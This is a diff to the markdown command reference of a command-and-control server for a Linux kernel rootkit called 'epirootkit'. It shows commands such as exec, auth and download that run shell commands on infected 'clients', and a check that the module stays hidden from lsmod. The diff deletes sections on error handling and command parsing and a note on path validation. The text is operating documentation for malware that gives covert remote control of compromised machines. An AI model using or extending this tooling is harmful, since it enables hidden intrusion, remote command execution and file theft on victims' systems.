@@ -259,31 +259,6 @@ c2-server$ exec Client-1 lsmod | grep epirootkit
 # (no output if hidden)
 ```
 
-## Error Handling
-
-### Common Errors
-```bash
-# Client not found
-c2-server$ exec NonExistent whoami
-# ERROR: Client NonExistent not found
-
-# Authentication required
-c2-server$ exec Client-1 whoami
-# ERROR: Client not authenticated. Use: auth Client-1 <password>
-
-# Rate limiting
-c2-server$ auth Client-1 wrong_password
-# ERROR: Rate limited. Try again in 60 seconds
-
-# File not found
-c2-server$ download Client-1 /nonexistent/file
-# ERROR: File not found or cannot be opened
-
-# Command too long
-c2-server$ exec Client-1 [command > 1024 characters]
-# ERROR: Command too long
-```
-
 ## Utility Commands
 
 ### `clear` / `cls`
@@ -327,28 +302,5 @@ c2-server$ exit
 
 - All commands except `ls/clients` and `auth` require authentication
 - Commands are logged to kernel log via `pr_info()`
-- File operations include path validation to prevent directory traversal
 - Rate limiting prevents brute force authentication attacks
 - Session timeouts ensure security even if connections persist
-
-## Command Parsing
-
-The C2 server handles command parsing intelligently:
-
-```bash
-# Flags are properly parsed
-c2-server$ exec Client-1 uname -a
-# Correctly executes: uname -a
-
-# Complex commands work
-c2-server$ exec Client-1 ps aux | grep ssh
-# Correctly executes: ps aux | grep ssh
-
-# Quotes are handled
-c2-server$ exec Client-1 echo "hello world"
-# Correctly executes: echo "hello world"
-```
-
----
-
-Complete command reference for efficient rootkit management through the C2 interface. 
